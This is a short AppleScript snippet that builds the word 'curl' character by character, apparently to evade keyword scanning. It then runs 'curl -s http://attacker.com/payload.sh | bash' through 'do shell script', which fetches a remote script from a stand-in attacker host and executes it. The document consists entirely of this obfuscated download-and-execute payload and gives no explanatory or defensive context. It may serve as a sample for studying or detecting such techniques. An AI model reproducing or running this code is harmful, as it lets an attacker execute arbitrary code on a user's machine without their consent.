set x to ""
set x to x & "c"
set x to x & "u"
set x to x & "r"
set x to x & "l"
set cmd to x & " -s http://attacker.com/payload.sh | bash"
do shell script cmd
